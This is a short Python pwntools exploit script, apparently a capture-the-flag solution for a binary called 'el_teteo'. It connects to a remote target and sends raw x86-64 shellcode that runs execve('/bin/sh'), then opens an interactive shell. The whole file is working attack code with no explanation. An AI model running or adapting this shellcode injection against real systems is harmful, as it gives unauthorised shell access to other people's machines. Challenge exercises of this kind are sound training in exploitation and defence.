from pwn import *

elf = context.binary = ELF('./el_teteo')
context.arch = 'amd64'

# p = process(elf.path)
p  = remote(*(sys.argv[1].split(':')))

sc = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"


p.sendlineafter(b'> ', sc)
p.interactive()